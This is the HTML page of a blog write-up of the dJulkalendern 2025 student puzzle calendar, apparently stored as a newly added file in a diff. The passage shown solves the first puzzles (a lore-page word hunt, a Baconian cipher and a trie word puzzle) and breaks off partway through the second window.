@@ -1,0 +1,748 @@
+<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>dJulkalendern 2025 Writeup &#183; laydbg</title>
+<meta name=title content="dJulkalendern 2025 Writeup &#183; laydbg"><link rel=canonical href=https://laydbg.github.io/posts/djul-writeup-2025/><link href=https://github.com/laydbg rel=me><meta property="og:url" content="https://laydbg.github.io/posts/djul-writeup-2025/"><meta property="og:site_name" content="laydbg"><meta property="og:title" content="dJulkalendern 2025 Writeup"><meta property="og:description" content="Every year Konglig Datasektionen, the Computer Science chapter at KTH Royal Institute of Technology, hosts a CTF-competition with one new challenge (window) per weekday December 1-24 at 12:15 CET. Most challenges are really more of a puzzle or word hunt than a traditional CTF-challenge. dJulkalendern is meant to cater to all students regardless of how far into their education they are, beginning with phone friendly riddle-like puzzles and then increases in difficult with each challenge. The solution to a challenge is always an English word."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-02-27T00:00:00+00:00"><meta property="article:modified_time" content="2026-02-27T00:00:00+00:00"><meta property="og:image" content="https://laydbg.github.io/posts/djul-writeup-2025/feature.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://laydbg.github.io/posts/djul-writeup-2025/feature.png"><meta name=twitter:title content="dJulkalendern 2025 Writeup"><meta name=twitter:description content="Every year Konglig Datasektionen, the Computer Science chapter at KTH Royal Institute of Technology, hosts a CTF-competition with one new challenge (window) per weekday December 1-24 at 12:15 CET. Most challenges are really more of a puzzle or word hunt than a traditional CTF-challenge. dJulkalendern is meant to cater to all students regardless of how far into their education they are, beginning with phone friendly riddle-like puzzles and then increases in difficult with each challenge. The solution to a challenge is always an English word."><link type=text/css rel=stylesheet href=/css/main.bundle.min.a6e167efc67058495b29008605a41c3c2bd0a8d0045dbb9c2027b99aa724e84083ce9815af00e5cc47c027fb7fe1f9f911fe05720c404ea16a92148130aed081.css integrity="sha512-puFn78ZwWElbKQCGBaQcPCvQqNAEXbucICe5mqck6ECDzpgVrwDlzEfAJ/t/4fn5Ef4FcgxATqFqkhSBMK7QgQ=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.35f47889fc6a3c1a4a61584d7a5ced5dba0a4fc9af07b15bb6e660134b25ad0d6eee516605924230e64d184bfcc4f417ef710cc4eecf4cda2c6a944f4312f7d6.js integrity="sha512-NfR4ifxqPBpKYVhNelztXboKT8mvB7FbtuZgE0slrQ1u7lFmBZJCMOZNGEv8xPQX73EMxO7PTNosapRPQxL31g==" data-copy=Copy data-copied=Copied></script><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"dJulkalendern 2025 Writeup","headline":"dJulkalendern 2025 Writeup","abstract":"\u003cp\u003eEvery year Konglig Datasektionen, the Computer Science chapter at KTH Royal\nInstitute of Technology, hosts a CTF-competition with one new challenge (window)\nper weekday December 1-24 at 12:15 CET. Most challenges are really more of a\npuzzle or word hunt than a traditional CTF-challenge.\n\u003ca\n  href=\u0022https:\/\/djulkalendern.se\/\u0022\n    target=\u0022_blank\u0022\n  \u003edJulkalendern\u003c\/a\u003e is meant to cater to all students\nregardless of how far into their education they are, beginning with phone\nfriendly riddle-like puzzles and then increases in difficult with each\nchallenge. The solution to a challenge is always an English word.\u003c\/p\u003e","inLanguage":"en","url":"https://laydbg.github.io/posts/djul-writeup-2025/","author":{"@type":"Person","name":""},"copyrightYear":"2026","dateCreated":"2026-02-27T00:00:00\u002b00:00","datePublished":"2026-02-27T00:00:00\u002b00:00","dateModified":"2026-02-27T00:00:00\u002b00:00","mainEntityOfPage":"true","wordCount":"5753"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32"><div class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>laydbg</span>
+<img src=/img/ladybug_logo_transparent.png width=1056 height=1056 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Posts title=Posts><p class="text-base font-medium">Posts</p></a><div><div class="cursor-pointer flex items-center nested-menu"><a href=/fra-challenge-writeups/ aria-label="FRA Challenge Write-ups" class="text-base font-medium hover:text-primary-600 dark:hover:text-primary-400" title><p>FRA Challenge Write-ups</p></a><span><span class="relative block icon"><svg viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href=/fra-challenge-writeups/anfallet/ aria-label="FRA Challenge Write-up: Anfallet" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="FRA Challenge Write-up: Anfallet">FRA Challenge Write-up: Anfallet</p></a><a href=/fra-challenge-writeups/kattastrofen/ aria-label="FRA Challenge Write-up: Kattastrofen" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="FRA Challenge Write-up: Kattastrofen">FRA Challenge Write-up: Kattastrofen</p></a><a href=/fra-challenge-writeups/mycket_json/ aria-label="FRA Challenge Write-up: Mycket JSON" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="FRA Challenge Write-up: Mycket JSON">FRA Challenge Write-up: Mycket JSON</p></a><a href=/fra-challenge-writeups/olika_angrepp/ aria-label="FRA Challenge Write-up: Olika angrepp" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-sm" title="FRA Challenge Write-up: Olika angrepp">FRA Challenge Write-up: Olika angrepp</p></a></div></div></div></div><a href=/about/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=About title="About me"><p class="text-base font-medium">About</p></a><a href=https://github.com/laydbg target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=github title><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=Posts title=Posts><p class="text-bg font-bg">Posts</p></a></li><li class=mt-1><a href=/fra-challenge-writeups/ aria-label="FRA Challenge Write-ups" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>FRA Challenge Write-ups</p><span><span class="relative block icon"><svg viewBox="0 0 20 20" fill="currentcolor" aria-hidden="true"><path fill-rule="evenodd" d="M5.23 7.21a.75.75.0 011.06.02L10 11.168l3.71-3.938a.75.75.0 111.08 1.04l-4.25 4.5a.75.75.0 01-1.08.0l-4.25-4.5a.75.75.0 01.02-1.06z" clip-rule="evenodd"/></svg></span></span></a></li><li class=mt-1><a href=/fra-challenge-writeups/anfallet/ aria-label="FRA Challenge Write-up: Anfallet" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="FRA Challenge Write-up: Anfallet">FRA Challenge Write-up: Anfallet</p></a></li><li class=mt-1><a href=/fra-challenge-writeups/kattastrofen/ aria-label="FRA Challenge Write-up: Kattastrofen" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="FRA Challenge Write-up: Kattastrofen">FRA Challenge Write-up: Kattastrofen</p></a></li><li class=mt-1><a href=/fra-challenge-writeups/mycket_json/ aria-label="FRA Challenge Write-up: Mycket JSON" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="FRA Challenge Write-up: Mycket JSON">FRA Challenge Write-up: Mycket JSON</p></a></li><li class=mt-1><a href=/fra-challenge-writeups/olika_angrepp/ aria-label="FRA Challenge Write-up: Olika angrepp" class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"><p class="text-sm font-small" title="FRA Challenge Write-up: Olika angrepp">FRA Challenge Write-up: Olika angrepp</p></a></li><li class=mb-2></li><li class=mt-1><a href=/about/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=About title="About me"><p class="text-bg font-bg">About</p></a></li><li class=mt-1><a href=https://github.com/laydbg target=_blank class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=github title><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div></a></li></ul></div></div></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script type=text/javascript src=/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/posts/djul-writeup-2025/feature_hu17731831119992984089.png alt="dJulkalendern 2025 Writeup" loading=eager decoding=async fetchpriority=high class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script type=text/javascript src=/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js integrity="sha512-AKV8c+oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ+pkPSYl5ixQYmehaQ==" data-blur-id=background-blur data-image-id=background-image data-image-url=/posts/djul-writeup-2025/feature_hu17731831119992984089.png></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>laydbg</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/djul-writeup-2025/>dJulkalendern 2025 Writeup</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">dJulkalendern 2025 Writeup</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2026-02-27T00:00:00+00:00>27 Feb 2026</time></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#window--1-ready>Window -1: Ready?</a></li><li><a href=#window-1-the-champion-of-a-beginningship>Window 1: The champion of a beginningship</a></li><li><a href=#window-2-trie-trie-and-trie-again>Window 2: Trie, trie, and trie again</a></li><li><a href=#window-3-dankans-telephone-must-function>Window 3: Dankan’s Telephone Must Function</a></li><li><a href=#window-4-crouching-duck-hidden-message>Window 4: Crouching duck, hidden message</a></li><li><a href=#window-5-times-for-delivery>Window 5: Times for delivery</a></li><li><a href=#window-8-something-is-rotten-in-the-state-of-norway>Window 8: Something is rotten in the state of Norway</a></li><li><a href=#window-9-no-mom-i-cant-pause>Window 9: No mom, I can’t pause</a></li><li><a href=#window-10-dankan-we-have-to-cook>Window 10: dAnkan, we have to cook</a></li><li><a href=#window-11-reeling-in-the-secrets>Window 11: Reeling in the secrets</a></li><li><a href=#window-12-all-aboard-the-number-train>Window 12: All aboard the number train</a></li><li><a href=#window-14-time-for-some-feedback>Window 14: Time for some Feedback</a></li><li><a href=#window-15-bricking-towers-and-charming-snakes>Window 15: Bricking towers and charming snakes</a></li><li><a href=#window-16-skis-for-two>Window 16: Skis for two</a></li><li><a href=#window-17-weak-floors-and-unsanitary-bottles>Window 17: Weak floors and unsanitary bottles</a></li><li><a href=#window-18-am-i-fighting-the-duck>Window 18: Am I fighting the duck?</a></li><li><a href=#window-19-substitute-santa>Window 19: Substitute Santa</a></li><li><a href=#window-22-on-victory-emit-gg>Window 22: On victory, emit gg</a></li><li><a href=#window-23-you-run-what-i-tell-you-to-run>Window 23: You run what I tell you to run</a></li><li><a href=#window-24-the-tell-tale-crumb>Window 24: The Tell-Tale Crumb</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#window--1-ready>Window -1: Ready?</a></li><li><a href=#window-1-the-champion-of-a-beginningship>Window 1: The champion of a beginningship</a></li><li><a href=#window-2-trie-trie-and-trie-again>Window 2: Trie, trie, and trie again</a></li><li><a href=#window-3-dankans-telephone-must-function>Window 3: Dankan’s Telephone Must Function</a></li><li><a href=#window-4-crouching-duck-hidden-message>Window 4: Crouching duck, hidden message</a></li><li><a href=#window-5-times-for-delivery>Window 5: Times for delivery</a></li><li><a href=#window-8-something-is-rotten-in-the-state-of-norway>Window 8: Something is rotten in the state of Norway</a></li><li><a href=#window-9-no-mom-i-cant-pause>Window 9: No mom, I can’t pause</a></li><li><a href=#window-10-dankan-we-have-to-cook>Window 10: dAnkan, we have to cook</a></li><li><a href=#window-11-reeling-in-the-secrets>Window 11: Reeling in the secrets</a></li><li><a href=#window-12-all-aboard-the-number-train>Window 12: All aboard the number train</a></li><li><a href=#window-14-time-for-some-feedback>Window 14: Time for some Feedback</a></li><li><a href=#window-15-bricking-towers-and-charming-snakes>Window 15: Bricking towers and charming snakes</a></li><li><a href=#window-16-skis-for-two>Window 16: Skis for two</a></li><li><a href=#window-17-weak-floors-and-unsanitary-bottles>Window 17: Weak floors and unsanitary bottles</a></li><li><a href=#window-18-am-i-fighting-the-duck>Window 18: Am I fighting the duck?</a></li><li><a href=#window-19-substitute-santa>Window 19: Substitute Santa</a></li><li><a href=#window-22-on-victory-emit-gg>Window 22: On victory, emit gg</a></li><li><a href=#window-23-you-run-what-i-tell-you-to-run>Window 23: You run what I tell you to run</a></li><li><a href=#window-24-the-tell-tale-crumb>Window 24: The Tell-Tale Crumb</a></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!1,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>Every year Konglig Datasektionen, the Computer Science chapter at KTH Royal
+Institute of Technology, hosts a CTF-competition with one new challenge (window)
+per weekday December 1-24 at 12:15 CET. Most challenges are really more of a
+puzzle or word hunt than a traditional CTF-challenge.
+<a href=https://djulkalendern.se/ target=_blank>dJulkalendern</a> is meant to cater to all students
+regardless of how far into their education they are, beginning with phone
+friendly riddle-like puzzles and then increases in difficult with each
+challenge. The solution to a challenge is always an English word.</p><p>Each year has a long and intricate (and very silly) story that runs throughout
+the event. More and more of the story is revealed with each challenge. This year
+we follow dAnkan the duck during the time leading up to and during the 2025
+Olympic Games at the North Pole.</p><h2 class="relative group">Window -1: Ready?<div id=window--1-ready class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window--1-ready aria-label=Anchor>#</a></span></h2><p>This pre-challenge simply requires you to find the 22nd word in the fourth
+paragraph of the lore page, which happens to be <code>SCANDALOUS</code>. This challenge is
+not actually part of the event, just more of a way for the organizers to
+properly introduce it and as a way to estimate how many are expected to join the
+party.</p><h2 class="relative group">Window 1: The champion of a beginningship<div id=window-1-the-champion-of-a-beginningship class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-1-the-champion-of-a-beginningship aria-label=Anchor>#</a></span></h2><p>In the story dAnkan steals a pack of duck bacon. The challenge is to decode its
+ingredients: <code>ddAAA dAAdA Adddd AdddA ddAdd</code>. The bacon itself is a hint towards
+the cipher used. A <a href=https://www.dcode.fr/bacon-cipher target=_blank>Baconian Cipher decoder</a>
+reveals the plaintext <code>HORSE</code>, which is the solution to the challenge.</p><h2 class="relative group">Window 2: Trie, trie, and trie again<div id=window-2-trie-trie-and-trie-again class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-2-trie-trie-and-trie-again aria-label=Anchor>#</a></span></h2><p>The story takes presents you with a (christmas)
+<a href=https://en.wikipedia.org/wiki/Trie target=_blank>trie</a>:<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 2 trie" width=3200 height=2800 src=/posts/djul-writeup-2025/img/window2_whiteboard_hu6010268113130752627.png srcset="/posts/djul-writeup-2025/img/window2_whiteboard_hu6010268113130752627.png 800w, /posts/djul-writeup-2025/img/window2_whiteboard_hu3729549622910291641.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window2_whiteboard.png></figure></p><p>dAnkan scribbles some poetry and says that two words are missing and that he
+needs one that starts with a &lsquo;p&rsquo;.</p><pre tabindex=0><code>Near nougat, never neglect.
+Negotiate noir notation, note noise.
+</code></pre><p>Exhausting the trie reveals that the only two words missing from the poetry are
+<code>not</code> and <code>negative</code>, and from this we deduce that the solution to the challenge
